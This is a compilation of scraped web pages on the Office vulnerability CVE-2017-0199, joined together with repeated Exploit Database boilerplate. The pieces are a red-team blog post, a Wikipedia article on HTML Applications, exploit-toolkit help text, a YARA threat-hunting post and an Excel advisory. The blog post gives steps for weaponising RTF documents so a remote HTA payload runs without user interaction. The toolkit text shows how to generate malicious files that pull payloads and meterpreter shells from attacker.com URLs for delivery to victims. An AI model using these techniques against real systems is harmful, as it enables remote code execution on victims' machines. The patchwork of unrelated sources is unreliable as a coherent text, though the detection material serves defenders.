lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Exploiting CVE-2017-0199: HTA Handler Vulnerability

Exploiting CVE-2017-0199: HTA Handler Vulnerability

FireEye recently [documented](https://www.fireeye.com/blog/threat-research/2017/04/acknowledgement_ofa.html) attacks of a 0-day vulnerability in the Windows HTA handler being exploited in the wild using Office RTF documents. The vulnerability later became referenced as CVE-2017-0199 and addressed in the April 2017 [Microsoft Update](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199). Neither the sample or any specific information were released on how to reproduce the vulnerability, however it was particularly interesting to the [ActiveBreach](https://www.mdsec.co.uk/services/red-teaming/) team because it was capable of bypassing known exploit mitigations such as EMET.

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ab-small-300x93.png)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ab-small.png)This blog post describes how to exploit this issue ***without user interaction*** based on our research; the technique discussed may differ from that used by the threat actors. It is also important to stress that the issue is not just restricted to RTF documents, we have successfully exploited this using other Office document types also.

## Exploitation Steps

While the technical steps to reproduce the issue as described by FireEye are sparse, the article contains several hints; firstly that the issue occurs using an OLE2 embedded link object, secondly while handling a HTA file.

To embed an OLE2 link object in to a document, open Microsoft Word and click on the insert object button as shown in the screenshot below:

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole1-300x34.png)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole1.png)

Select Create From File, insert the URL to the HTA file and tick both Link to file and Display as Icon.

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole2-300x186.png)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole2.png)

Save the document as a DOCX, DOC or RTF file; all of which handle OLE2 link objects.

At this point, some social engineering is required to get the user to run the payload as they must double click the icon for the OLE object. However, no warnings or run prompts are displayed should the user do this, as can be seen below:

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/interaction-300x126.gif)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/interaction.gif)

However, the icon and text may look somewhat suspicious to the educated user; it is therefore possible to improve the campaign by replacing the icon and filename and rendering the object in Word. This can be achieved by not selecting the “Display as Icon” check box and serve the document content-type as application/rtf or application/doc:

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole3-300x186.png)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole3.png)

This causes the HTA to be rendered as follows:

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole4-300x148.png)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole4.png)

However, user interaction is still required and the user must double click on the “hello” text this time or save the file to force the document to perform the connection to update the content and display it.

However, FireEye’s description does not explicitly state that user interaction is required and hints that the payload should automatically run when the document is opened. Research by the [ActiveBreach](https://www.mdsec.co.uk/services/red-teaming/) team discovered how this can be achieved. Delving further in to the [RTF RFC](http://www.biblioscape.com/rtf15_spec.htm) the “*\objupdate*” control was discovered:

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole5-300x153.png)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole5.png)

The description for this control is particularly interesting as it implies the object will update before displaying itself:

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole6-300x109.png)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/ole6.png)

As such, it should be possible to create a document containing an \objupdate control that will ultimately force it to update on start up. This can be achieved by taking the previously created document and modifying it in a text editor:

Original:

*{\object\objautlink \rsltpict\objw9027\objh450{\\*\objclass Word.Document.8}{\\*\objdata*

Document with injected \objupdate control:

*{\object\objautlink**\objupdate**\rsltpict\objw9027\objh450{\\*\objclass Word.Document.8}{\\*\objdata*

Opening the RTF file now causes the hosted HTA file to run without user interaction:

[![](https://www.mdsec.co.uk/wp-content/uploads/2017/04/sploit-300x162.gif)](https://www.mdsec.co.uk/wp-content/uploads/2017/04/sploit.gif)

It’s also worth noting that our research shows that if the user does not have Microsoft Office installed, the issue can still be exploited in WordPad however interaction is required.

## Detection and Response

A number of Yara rules have been released by the response community to detect this issue. In many cases these are somewhat inaccurate and may generate false positives as they rely on detection based on an RTF document containing an OLE2Link object. This does not necessarily imply malicious behaviour and may be a legitimately embedded object.

To effectively detect CVE-2017-0199, Yara rules should add a condition to identify the *\objupdate* control.

From Wikipedia, the free encyclopedia

Microsoft Windows program
This article is about Microsoft's proprietary HTA implementation. For information regarding the HTML5 Cache Manifest, also referred to as offline HTML applications, see [Cache manifest in HTML5](/wiki/Cache_manifest_in_HTML5 "Cache manifest in HTML5").

HTML Application (HTA)
| [Filename extension](/wiki/Filename_extension "Filename extension") | .hta |
| --- | --- |
| [Internet media type](/wiki/Media_type "Media type") | application/hta |
| [Magic number](/wiki/File_format#Magic_number "File format") | %hta |
| Developed by | [Microsoft](/wiki/Microsoft "Microsoft") |
| Website | [learn.microsoft.com/en-us/previous-versions/ms536471(v=vs.85)?redirectedfrom=MSDN](https://learn.microsoft.com/en-us/previous-versions/ms536471%28v%3Dvs.85%29?redirectedfrom=MSDN) |

An **HTML Application** (**HTA**) is a [Microsoft Windows](/wiki/Microsoft_Windows "Microsoft Windows") program whose source code consists of [HTML](/wiki/HTML "HTML"), [Dynamic HTML](/wiki/Dynamic_HTML "Dynamic HTML"), and one or more scripting languages supported by [Internet Explorer](/wiki/Internet_Explorer "Internet Explorer"), such as [VBScript](/wiki/VBScript "VBScript") or [JScript](/wiki/JScript "JScript"). The HTML is used to generate the user interface, and the scripting language is used for the program logic. An HTA executes without the constraints of the web browser security model; in fact, it executes as a "fully trusted" application.

The usual file extension of an HTA is `.hta`.

The ability to execute HTAs was introduced to Microsoft Windows in 1999, along with the release of [Microsoft Internet Explorer 5](/wiki/Microsoft_Internet_Explorer_5 "Microsoft Internet Explorer 5").[[1]](#cite_note-1) On December 9, 2003, this technology was [patented](/wiki/Patent "Patent").[[2]](#cite_note-2)

## Uses

[[edit](/w/index.php?title=HTML_Application&action=edit&section=1 "Edit section: Uses")]

HTAs give the developer the features of HTML together with the advantages of scripting languages. They are popular with Microsoft system administrators who use them for system administration from prototypes to "full-scale" applications, especially where flexibility and speed of development are critical.[[3]](#cite_note-msintro-3)

## Environment

[[edit](/w/index.php?title=HTML_Application&action=edit&section=2 "Edit section: Environment")]
### Execution

[[edit](/w/index.php?title=HTML_Application&action=edit&section=3 "Edit section: Execution")]
[![](//upload.wikimedia.org/wikipedia/commons/0/0b/RectifiedWikipediaHTAWindow.png)](/wiki/File%3ARectifiedWikipediaHTAWindow.png)

One screenshot of one example window that is produced by `mshta.exe`

An HTA is executed using the program `mshta.exe`, or, alternatively, double-clicking on the file. This program is typically installed along with Internet Explorer. `mshta.exe` executes the HTA by instantiating the Internet Explorer rendering engine (mshtml) as well as any required language engines (such as vbscript.dll).

An HTA is treated like any executable file with extension [`.exe`](/wiki/EXE "EXE"). When executed via mshta.exe (or if the file icon is double-clicked), it runs immediately. When executed remotely via the browser, the user is asked once, before the HTA is downloaded, whether or not to save or run the application; if saved, it can simply be run on demand after that.[[3]](#cite_note-msintro-3)

By default, HTAs are rendered as per "standards-mode content in IE7 Standards mode and quirks mode content in IE5 (Quirks) mode", but this can be altered using `X-UA-Compatible` headers.[[3]](#cite_note-msintro-3)

HTAs are dependent on the Trident (MSHTML) browser engine, used by [Internet Explorer](/wiki/Internet_Explorer "Internet Explorer"), but are not dependent on the Internet Explorer application itself. If a user [removes Internet Explorer](/wiki/Removal_of_Internet_Explorer "Removal of Internet Explorer") from Windows, via the Control Panel, the MSHTML engine remains and HTAs continue to work. HTAs continue to work in Windows 11 as well.

HTAs are fully supported running in modes equivalent to Internet Explorer versions 5 to 9. Further versions, such as 10 and 11, still support HTAs though with some minor features turned off.[*[citation needed](/wiki/Wikipedia%3ACitation_needed "Wikipedia:Citation needed")*]

### Security considerations

[[edit](/w/index.php?title=HTML_Application&action=edit&section=4 "Edit section: Security considerations")]
Main article: [Browser security](/wiki/Browser_security "Browser security")

When a regular HTML file is executed, the execution is confined to the security model of the [web browser](/wiki/Web_browser "Web browser"). This means it is confined to communicating with the server, manipulating the page's [object model](/wiki/Object_model "Object model") (usually to validate forms and/or create interesting visual effects) and reading or writing [cookies](/wiki/HTTP_cookie "HTTP cookie").

On the other hand, an HTA runs as a fully trusted application and therefore has more privileges than a normal HTML file; for example, an HTA can create, edit and remove files and [registry](/wiki/Windows_Registry "Windows Registry") entries. Although HTAs run in this 'trusted' environment, querying [Active Directory](/wiki/Active_Directory "Active Directory") can be subject to Internet Explorer Zone logic and associated error messages.

## Development

[[edit](/w/index.php?title=HTML_Application&action=edit&section=5 "Edit section: Development")]

To customize the appearance of an HTA, an optional tag `hta:application` was introduced to the `HEAD` section. This tag exposes a set of attributes that enable control of border style, the program icon, etc., and provide information such as the argument (command line) used to launch the HTA.[[4]](#cite_note-4) Otherwise, an HTA has the same format as an HTML page.

Any text editor can be used to create an HTA. Editors with special features for developing HTML applications may be obtained from Microsoft[[5]](#cite_note-5) or from third-party sources.[[6]](#cite_note-6)

An existing HTML file (with file extension `.htm` or `.html`, for example) can be changed to an HTA by simply changing the extension to `.hta`.

## Vulnerabilities

[[edit](/w/index.php?title=HTML_Application&action=edit&section=6 "Edit section: Vulnerabilities")]

HTA have been used to deliver malware.[[7]](#cite_note-7)[[8]](#cite_note-8) One particular HTA, named *[4chan](/wiki/4chan "4chan").hta* (detected by antiviruses as JS/Chafpin.gen), was widely distributed by the users of the imageboard as a [steganographic](/wiki/Steganographic "Steganographic") image in which the user were instructed to download the picture as an HTA file, which when executed, would cause the computer to automatically spam the website (evading 4chan's [CAPTCHA](/wiki/CAPTCHA "CAPTCHA") in the process) with alternate variants of itself; it was reported that such attacks were previously delivered in which the user was prompted to save it as a [.js](/wiki/JavaScript "JavaScript") file.[[9]](#cite_note-9)

## Example

[[edit](/w/index.php?title=HTML_Application&action=edit&section=7 "Edit section: Example")]

This is an example of [Hello World](/wiki/%22Hello%2C_World%21%22_program "\"Hello, World!\" program") as an HTML Application.

```
<HTML>
<HEAD>
<HTA:APPLICATION ID="HelloExample"
   BORDER="bold"
   BORDERSTYLE="complex"/>
<TITLE>HTA - Hello World</TITLE>
</HEAD>
<BODY>
<H2>HTA - Hello World</H2>
</BODY>
</HTML>

```

### Command line arguments:

```
# python cve-2017-0199_toolkit.py -h

This is a handy toolkit to exploit CVE-2017-0199 (Microsoft office RCE)

Modes:

-M gen                                          Generate Malicious file only

     Generate malicious RTF/PPSX file:

      -w <Filename.rtf/Filename.ppsx>     Name of malicious RTF/PPSX file (Share this file with victim).

      -u <http://attacker.com/test.hta>   The path to an HTA/SCT file. Normally, this should be a domain or IP where        this                                          tool is running.
                                      For example, http://attackerip.com/test.doc (This URL will be included in 	                                              malicious RTF/PPSX file and will be requested once victim will open malicious RTF file.
      -t RTF|PPSX (default = RTF)         Type of the file to be generated.
      -x 0|1  (default = 0)               Generate obfuscated RTF file. 0 = Disable, 1 = Enable.

-M exp                                          Start exploitation mode

     Exploitation:

      -t RTF|PPSX (default = RTF)         Type of file to be exolited.
      -H </tmp/custom>                Local path of a custom HTA/SCT file which needs to be delivered and executed on target.
                                          NOTE: This option will not deliver payloads specified through options "-e" and "-l"

      -p <TCP port:Default 80>            Local port number.

      -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

      -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.

A while ago Michel wrote a blog post [Tracking threat actors through .LNK files](https://blog.nviso.be/2017/04/04/tracking-threat-actors-through-lnk-files/).

In this post, we want to illustrate how [VirusTotal](https://virustotal.com/) (retro) hunting can be leveraged to extract malware samples and metadata linked to a single threat actor. We use the power of YARA rules to pinpoint the metadata we are looking for.

With some of the metadata extracted from the [.LNK file we wrote about in our previous blog post](https://blog.nviso.be/2017/04/04/tracking-threat-actors-through-lnk-files/) (Volume ID and MAC address), we’re going to search on [VirusTotal](https://virustotal.com/) for samples with that metadata. It is clear from the MAC address 00:0C:29:5A:39:04 that the threat actor used a virtual machine to build malware: 00:0C:29 is an OUI owned by VMware. We wonder if the same VM was used to create other samples.

With a VirusTotal Intelligence subscription, one can search through the VirusTotal sample database, for example with YARA rules. We use the following YARA rule for the metadata:

```

rule MALDOC_LNK {
strings:
$BirthObjectId = {C2 CC 13 98 18 B9 E2 41 82 40 54 A8 AD E2 0A 9A}
$MACAddress = {00 0C 29 5A 39 04}
condition:
all of them
}

```

VTI supports hunting and retro-hunting with YARA rules. With hunting, you will be informed each time your YARA rules triggers on the VT servers each time a newly submitted sample matching your rule. With retro-hunting, YARA rules are used to scan through 75TB of samples in the VT database. This correspond more or less to the set of samples submitted in the last three months.

Here is the result from a retro-hunt using YARA rule MALDOC\_LNK:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170424-140328.png?w=625)

Next step is to download and analyse all these samples. Since we did not include a file type condition in our YARA rule, we get different types of files: Word .doc files, .lnk files, raw OLE streams containing .lnk files, and MIME files (e-mails with Word documents as attachment).

With this command we search for strings containing “http” in the samples:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170424-140543.png?w=625)

So we see that the same virtual machine has been used to created several samples. Here we extract the commands launched via the .lnk file:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170424-140617.png?w=625)

There are 2 types of commands: downloading one executable; and downloading one executable and a decoy document.

The metadata from the OLE files reveals that the virtual machine has been used for a couple of weeks:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170424-214631.png)

**Conclusion**

With metadata and VirusTotal, it is possible to identify samples created by the same actor over a period of 3 months. These samples can provide new metadata and IOCs.

Title: MS Office Excel (all versions) Arbitrary Code Execution Vulnerability

Date: September 30th, 2017.

Author: Eduardo Braun Prado

Vendor Homepage: http://www.microsoft.com/

Software Link: https://products.office.com/

Version: 2007,2010,2013,2016  32/64 bits (x86 and x64)

Tested on: Windows 10/8.1/8.0/7/Server 2012/Server 2008/Vista (X86 and x64)

CVE: 2017-0199

Description:

MS Excel contains a remote code execution vulnerability upon processing OLE objects. Although this is a different issue from the
MS Word HTA execution vulnerability, it has been patched together, 'silently'. By performing some tests from the Word HTA PoC posted
on exploit-db[dot]com, it´s possible to exploit it through Excel too, however the target would need to either accept a security warning
regarding external links or double click inside the Excel window, same applies for Powerpoint, so I guess this is the reason, Word caught
the attention and no exploit PoC was made available to other Office apps.

This vulnerability exists in the way Excel handles parameters passed to the "DDEService" attribute of links, leading to the search for a
program to display it. As it does not impose restrictions on what program is going to be executed, for instance, only programs located in the
Office install directory, it is possible to invoke arbitrary local programs with parameters, leading to system compromise.
Since Excel blocks automatic update of linked files, the target must be tricked into double clicking anywhere inside the document.
(The linked object occupies basicly the whole document window). Without the patch applied no warning/prompt is shown;
With the patch a prompt is shown asking if it´s ok to run 'xxxx.exe', where 'xxxx.exe' can have arbitrary names as long as it´s at most 8
chars long, so we could still fake/spoof it as another Office app (the app name cannot be the same of the legitimate, eg. 'Excel').

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
